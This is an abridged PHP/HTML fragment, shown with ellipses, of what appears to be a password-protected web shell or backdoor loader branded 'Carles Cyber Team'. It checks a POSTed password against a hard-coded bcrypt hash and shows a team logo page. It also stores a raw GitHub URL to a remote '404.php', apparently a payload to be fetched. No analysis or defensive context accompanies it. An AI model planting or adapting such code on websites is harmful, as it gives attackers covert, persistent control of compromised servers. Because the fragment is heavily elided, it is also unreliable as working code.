...
if (is_logged_in()) {
    ...
    $b0rn = 'https://raw.githubusercontent.com/carlescyber/carles/refs/heads/main/404.php';
    ...
    if (isset($_POST['password'])) { 
        ...
        $hashed_key = '$2y$10$VIv4Fuq8uJAzASS5OV5/uO3PDHeRMmJdWgTR8KOK.EDp7yjXVwLVi'; // https://bcrypt.online/ 
...
<html lang="en">
  ...
  <body>
    <div class="container">
      <img id="clickableImage" src="https://i.postimg.cc/yYk0W5mX/carlesss.png" width="500px" alt="Infinity Cyber Team">
      <div id="linkContainer"></div>
      <p>~ Carles Cyber Team ~</p>
    </div>
  </body>
</html>
<?php } ?>